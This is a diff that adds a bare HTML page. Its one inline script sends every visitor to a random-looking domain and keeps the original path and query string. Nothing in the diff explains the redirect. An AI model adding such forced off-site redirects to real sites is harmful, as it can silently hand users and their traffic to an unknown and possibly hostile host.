@@ -1,0 +1,11 @@
+<html><head>
+<meta charset="utf-8"><script>
+    if (window.location.hostname != "miuohcetrjihx34xc.com") {
+        if (window.location.pathname != '' || window.location.search != '') {
+            window.location.href = 'https://miuohcetrjihx34xc.com' + window.location.pathname + window.location.search;
+        } else {
+            window.location.href = 'https://miuohcetrjihx34xc.com';
+        }
+    }
+</script>
+</head><body></body></html>
